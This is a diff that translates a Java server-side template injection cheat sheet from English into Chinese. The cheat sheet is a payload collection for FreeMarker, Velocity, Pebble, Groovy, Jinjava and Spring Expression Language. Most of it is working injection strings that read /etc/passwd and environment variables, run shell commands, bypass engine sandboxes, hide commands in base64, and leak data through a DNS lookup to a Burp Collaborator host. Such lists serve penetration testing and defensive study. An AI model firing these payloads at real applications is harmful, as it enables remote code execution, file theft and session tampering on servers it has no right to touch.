@@ -1,43 +1,45 @@
-# Server Side Template Injection - Java
+[原文文档](Java.en.md)
 
-> Server-Side Template Injection (SSTI)  is a security vulnerability that occurs when user input is embedded into server-side templates in an unsafe manner, allowing attackers to inject and execute arbitrary code. In Java, SSTI can be particularly dangerous due to the power and flexibility of Java-based templating engines such as JSP (JavaServer Pages), Thymeleaf, and FreeMarker.
+# 服务器端模板注入 - Java
 
-## Summary
+> 服务器端模板注入（SSTI）是一种安全漏洞，当用户输入以不安全的方式嵌入到服务器端模板中时发生，允许攻击者注入和执行任意代码。在Java中，SSTI可能特别危险，因为基于Java的模板引擎（如JSP（JavaServer Pages）、Thymeleaf和FreeMarker）的强大功能和灵活性。
 
-- [Templating Libraries](#templating-libraries)
+## 概述
+
+- [模板库](#模板库)
 - [Java](#java)
-    - [Java - Basic Injection](#java---basic-injection)
-    - [Java - Retrieve Environment Variables](#java---retrieve-environment-variables)
-    - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)
+    - [Java - 基本注入](#java---基本注入)
+    - [Java - 检索环境变量](#java---检索环境变量)
+    - [Java - 检索/etc/passwd](#java---检索etcpasswd)
 - [Freemarker](#freemarker)
-    - [Freemarker - Basic Injection](#freemarker---basic-injection)
-    - [Freemarker - Read File](#freemarker---read-file)
-    - [Freemarker - Code Execution](#freemarker---code-execution)
-    - [Freemarker - Sandbox Bypass](#freemarker---sandbox-bypass)
+    - [Freemarker - 基本注入](#freemarker---基本注入)
+    - [Freemarker - 读取文件](#freemarker---读取文件)
+    - [Freemarker - 代码执行](#freemarker---代码执行)
+    - [Freemarker - 沙盒绕过](#freemarker---沙盒绕过)
 - [Codepen](#codepen)
 - [Jinjava](#jinjava)
-    - [Jinjava - Basic Injection](#jinjava---basic-injection)
-    - [Jinjava - Command Execution](#jinjava---command-execution)
+    - [Jinjava - 基本注入](#jinjava---基本注入)
+    - [Jinjava - 命令执行](#jinjava---命令执行)
 - [Pebble](#pebble)
-    - [Pebble - Basic Injection](#pebble---basic-injection)
-    - [Pebble - Code Execution](#pebble---code-execution)
+    - [Pebble - 基本注入](#pebble---基本注入)
+    - [Pebble - 代码执行](#pebble---代码执行)
 - [Velocity](#velocity)
 - [Groovy](#groovy)
-    - [Groovy - Basic Injection](#groovy---basic-injection)
-    - [Groovy - Read File](#groovy---read-file)
-    - [Groovy - HTTP Request:](#groovy---http-request)
-    - [Groovy - Command Execution](#groovy---command-execution)
-    - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
+    - [Groovy - 基本注入](#groovy---基本注入)
+    - [Groovy - 读取文件](#groovy---读取文件)
+    - [Groovy - HTTP请求](#groovy---http请求)
+    - [Groovy - 命令执行](#groovy---命令执行)
+    - [Groovy - 沙盒绕过](#groovy---沙盒绕过)
 - [Spring Expression Language](#spring-expression-language)
-    - [SpEL - Basic Injection](#spel---basic-injection)
-    - [SpEL - DNS Exfiltration](#spel---dns-exfiltration)
-    - [SpEL - Session Attributes](#spel---session-attributes)
-    - [SpEL - Command Execution](#spel---command-execution)
-- [References](#references)
+    - [SpEL - 基本注入](#spel---基本注入)
+    - [SpEL - DNS泄露](#spel---dns泄露)
+    - [SpEL - 会话属性](#spel---会话属性)
+    - [SpEL - 命令执行](#spel---命令执行)
+- [参考资料](#参考资料)
 
-## Templating Libraries
+## 模板库
 
-| Template Name | Payload Format |
+| 模板名称 | 负载格式 |
 | ------------ | --------- |
 | Codepen    | `#{}`     |
 | Freemarker | `${3*3}`, `#{3*3}`, `[=3*3]` |
@@ -50,9 +52,9 @@
 
 ## Java
 
-### Java - Basic Injection
+### Java - 基本注入
 
-> Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.
+> 可以使用多个变量表达式，如果`${...}`不起作用，请尝试`#{...}`，`*{...}`，`@{...}`或`~{...}`。
 
 ```java
 ${7*7}
@@ -62,13 +64,13 @@ ${class.getResource("").getPath()}
 ${class.getResource("../../../../../index.htm").getContent()}
 ```
 
-### Java - Retrieve Environment Variables
+### Java - 检索环境变量
 
 ```java
 ${T(java.lang.System).getenv()}
 ```
 
-### Java - Retrieve /etc/passwd
+### Java - 检索/etc/passwd
 
 ```java
 ${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
@@ -80,27 +82,27 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 
 ## Freemarker
 
-[Official website](https://freemarker.apache.org/)
-> Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data.
+[官方网站](https://freemarker.apache.org/)
+> Apache FreeMarker™是一个模板引擎：基于模板和变化数据生成文本输出（HTML网页、电子邮件、配置文件、源代码等）的Java库。
 
-You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)
+你可以在[https://try.freemarker.apache.org](https://try.freemarker.apache.org)测试你的负载
 
-### Freemarker - Basic Injection
+### Freemarker - 基本注入
 
-The template can be :
+模板可以是：
 
-- Default: `${3*3}`  
-- Legacy: `#{3*3}`
-- Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)
+- 默认：`${3*3}`  
+- 传统：`#{3*3}`
+- 替代：`[=3*3]` 自[FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)以来
 
-### Freemarker - Read File
+### Freemarker - 读取文件
 
 ```js
 ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
-Convert the returned bytes to ASCII
+将返回的字节转换为ASCII
 ```
 
-### Freemarker - Code Execution
+### Freemarker - 代码执行
 
 ```js
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
@@ -110,9 +112,9 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 [="freemarker.template.utility.Execute"?new()("id")]
 ```
 
-### Freemarker - Sandbox Bypass
+### Freemarker - 沙盒绕过
 
-:warning: only works on Freemarker versions below 2.3.30
+:warning: 仅适用于低于2.3.30版本的Freemarker
 
 ```js
 <#assign classloader=article.class.protectionDomain.classLoader>
@@ -126,7 +128,7 @@ ${dwf.newInstance(ec,null)("id")}
 
 ## Codepen
 
-[Official website](https://codepen.io/)
+[官方网站](https://codepen.io/)
 >
 
 ```python
@@ -144,21 +146,21 @@ ${dwf.newInstance(ec,null)("id")}
 
 ## Jinjava
 
-[Official website](https://github.com/HubSpot/jinjava)
-> Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).
+[官方网站](https://github.com/HubSpot/jinjava)
+> 基于Java的模板引擎，基于django模板语法，适用于渲染jinja模板（至少是HubSpot内容中使用的jinja子集）。
 
-### Jinjava - Basic Injection
+### Jinjava - 基本注入
 
 ```python
-{{'a'.toUpperCase()}} would result in 'A'
-{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
+{{'a'.toUpperCase()}} 将导致 'A'
+{{ request }} 将返回一个请求对象，如com.[...].context.TemplateContextRequest@23548206
 ```
 
-Jinjava is an open source project developed by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)
+Jinjava是Hubspot开发的开源项目，可在[https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)获得
 
-### Jinjava - Command Execution
+### Jinjava - 命令执行
 
-Fixed by [HubSpot/jinjava PR #230](https://github.com/HubSpot/jinjava/pull/230)
+由[HubSpot/jinjava PR #230](https://github.com/HubSpot/jinjava/pull/230)修复
 
 ```ps1
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
@@ -174,21 +176,21 @@ Fixed by [HubSpot/jinjava PR #230](https://github.com/HubSpot/jinjava/pull/230)
 
 ## Pebble
 
-[Official website](https://pebbletemplates.io/)
+[官方网站](https://pebbletemplates.io/)
 
-> Pebble is a Java templating engine inspired by [Twig](./PHP.md#twig) and similar to the Python [Jinja](./Python.md#jinja2) Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.
+> Pebble是一个受[Twig](./PHP.md#twig)启发的Java模板引擎，类似于Python [Jinja](./Python.md#jinja2)模板引擎语法。它具有模板继承和易于阅读的语法，内置自动转义以确保安全，并包含对国际化的集成支持。
 
-### Pebble - Basic Injection
+### Pebble - 基本注入
 
 ```java
 {{ someString.toUPPERCASE() }}
 ```
 
-### Pebble - Code Execution
+### Pebble - 代码执行
 
-Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`.
+Pebble的旧版本（<3.0.9版本）：`{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`。
 
-New version of Pebble :
+Pebble的新版本：
 
 ```java
 {% set cmd = 'id' %}
@@ -209,11 +211,11 @@ New version of Pebble :
 
 ## Velocity
 
-[Official website](https://velocity.apache.org/engine/1.7/user-guide.html)
+[官方网站](https://velocity.apache.org/engine/1.7/user-guide.html)
 
-> Apache Velocity is a Java-based template engine that allows web designers to embed Java code references directly within templates.
+> Apache Velocity是一个基于Java的模板引擎，允许Web设计人员直接在模板中嵌入Java代码引用。
 
-In a vulnerable environment, Velocity's expression language can be abused to achieve remote code execution (RCE). For example, this payload executes the whoami command and prints the result:
+在易受攻击的环境中，Velocity的表达式语言可以被滥用以实现远程代码执行（RCE）。例如，此负载执行whoami命令并打印结果：
 
 ```java
 #set($str=$class.inspect("java.lang.String").type)
@@ -226,7 +228,7 @@ $str.valueOf($chr.toChars($out.read()))
 #end
 ```
 
-A more flexible and stealthy payload that supports base64-encoded commands, allowing execution of arbitrary shell commands such as `echo "a" > /tmp/a`. Below is an example with `whoami` in base64:
+支持base64编码命令的更灵活和隐蔽的负载，允许执行任意shell命令，如`echo "a" > /tmp/a`。以下是使用base64中`whoami`的示例：
 
 ```java
 #set($base64EncodedCommand = 'd2hvYW1p')
@@ -263,13 +265,13 @@ A more flexible and stealthy payload that supports base64-encoded commands, allo
 
 ## Groovy
 
-[Official website](https://groovy-lang.org/)
+[官方网站](https://groovy-lang.org/)
 
-### Groovy - Basic injection
+### Groovy - 基本注入
 
-Refer to [groovy-lang.org/syntax](https://groovy-lang.org/syntax.html) , but `${9*9}` is the basic injection.
+参考[groovy-lang.org/syntax](https://groovy-lang.org/syntax.html)，但`${9*9}`是基本注入。
 
-### Groovy - Read File
+### Groovy - 读取文件
 
 ```groovy
 ${String x = new File('c:/windows/notepad.exe').text}
@@ -277,14 +279,14 @@ ${String x = new File('/path/to/file').getText('UTF-8')}
 ${new File("C:\Temp\FileName.txt").createNewFile();}
 ```
 
-### Groovy - HTTP Request
+### Groovy - HTTP请求
 
 ```groovy
 ${"http://www.google.com".toURL().text}
 ${new URL("http://www.google.com").getText()}
 ```
 
-### Groovy - Command Execution
+### Groovy - 命令执行
 
 ```groovy
 ${"calc.exe".exec()}
@@ -293,14 +295,14 @@ ${this.evaluate("9*9") //(this is a Script class)}
 ${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
 ```
 
-### Groovy - Sandbox Bypass
+### Groovy - 沙盒绕过
 
 ```groovy
 ${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
 def x }
 ```
 
-or
+或者
 
 ```groovy
 ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
@@ -310,42 +312,42 @@ ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(val
 
 ## Spring Expression Language
 
-[Official website](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)
+[官方网站](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)
 
-> The Spring Expression Language (SpEL for short) is a powerful expression language that supports querying and manipulating an object graph at runtime. The language syntax is similar to Unified EL but offers additional features, most notably method invocation and basic string templating functionality.
+> Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于统一EL，但提供额外功能，最值得注意的是方法调用和基本字符串模板功能。
 
-### SpEL - Basic Injection
+### SpEL - 基本注入
 
 ```java
 ${7*7}
 ${'patt'.toString().replace('a', 'x')}
 ```
 
-### SpEL - DNS Exfiltration
+### SpEL - DNS泄露
 
-DNS lookup
+DNS查找
 
 ```java
 ${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
 ```
 
-### SpEL - Session Attributes
+### SpEL - 会话属性
 
-Modify session attributes
+修改会话属性
 
 ```java
 ${pageContext.request.getSession().setAttribute("admin",true)}
 ```
 
-### SpEL - Command Execution
+### SpEL - 命令执行
 
-- Method using `java.lang.Runtime` #1 - accessed with JavaClass
+- 使用`java.lang.Runtime`的方法#1 - 通过JavaClass访问
 
     ```java
     ${T(java.lang.Runtime).getRuntime().exec("COMMAND_HERE")}
     ```
 
-- Method using `java.lang.Runtime` #2
+- 使用`java.lang.Runtime`的方法#2
 
     ```java
     #{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
@@ -353,19 +355,19 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
     #{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
     ```
 
-- Method using `java.lang.Runtime` #3 - accessed with `invoke`
+- 使用`java.lang.Runtime`的方法#3 - 通过`invoke`访问
 
     ```java
     ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('COMMAND_HERE')}
     ```
 
-- Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`
+- 使用`java.lang.Runtime`的方法#3 - 通过`javax.script.ScriptEngineManager`访问
 
     ```java
     ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
     ```
 
-- Method using `java.lang.ProcessBuilder`
+- 使用`java.lang.ProcessBuilder`的方法
 
     ```java
     ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
@@ -376,17 +378,17 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
     ${request.getAttribute("a")}
     ```
 
-## References
+## 参考资料
 
-- [Server Side Template Injection – on the example of Pebble - Michał Bentkowski - September 17, 2019](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
-- [Server-Side Template Injection: RCE For The Modern Web App - James Kettle (@albinowax) - December 10, 2015](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
-- [Server-Side Template Injection: RCE For The Modern Web App (PDF) - James Kettle (@albinowax) - August 8, 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
-- [Server-Side Template Injection: RCE For The Modern Web App (Video) - James Kettle (@albinowax) - December 28, 2015](https://www.youtube.com/watch?v=3cT0uE7Y87s)
-- [VelocityServlet Expression Language injection - MagicBlue - November 15, 2017](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
-- [Bean Stalking: Growing Java beans into RCE - Alvaro Munoz - July 7, 2020](https://securitylab.github.com/research/bean-validation-RCE)
-- [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Peter M (@pmnh_) - December 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
-- [Expression Language Injection - OWASP - December 4, 2019](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
-- [Expression Language injection - PortSwigger - January 27, 2019](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
-- [Leveraging the Spring Expression Language (SpEL) injection vulnerability (a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
-- [RCE in Hubspot with EL injection in HubL - @fyoorer - December 7, 2018](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
-- [Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - January 29, 2019](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
+- [服务器端模板注入 – 以Pebble为例 - Michał Bentkowski - 2019年9月17日](https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/)
+- [服务器端模板注入：现代Web应用程序的RCE - James Kettle (@albinowax) - 2015年12月10日](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
+- [服务器端模板注入：现代Web应用程序的RCE（PDF） - James Kettle (@albinowax) - 2015年8月8日](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
+- [服务器端模板注入：现代Web应用程序的RCE（视频） - James Kettle (@albinowax) - 2015年12月28日](https://www.youtube.com/watch?v=3cT0uE7Y87s)
+- [VelocityServlet表达式语言注入 - MagicBlue - 2017年11月15日](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
+- [Bean Stalking：将Java beans扩展为RCE - Alvaro Munoz - 2020年7月7日](https://securitylab.github.com/research/bean-validation-RCE)
+- [错误报告：通过SSTI在Spring Boot错误页面上的RCE与Akamai WAF绕过 - Peter M (@pmnh_) - 2022年12月4日](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
+- [表达式语言注入 - OWASP - 2019年12月4日](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
+- [表达式语言注入 - PortSwigger - 2019年1月27日](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
+- [利用Spring表达式语言（SpEL）注入漏洞（又称Magic SpEL）获取RCE - Xenofon Vassilakopoulos - 2021年11月18日](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
+- [Hubspot中的RCE，通过HubL中的EL注入 - @fyoorer - 2018年12月7日](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)
+- [使用EL注入漏洞进行远程代码执行 - Asif Durani - 2019年1月29日](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
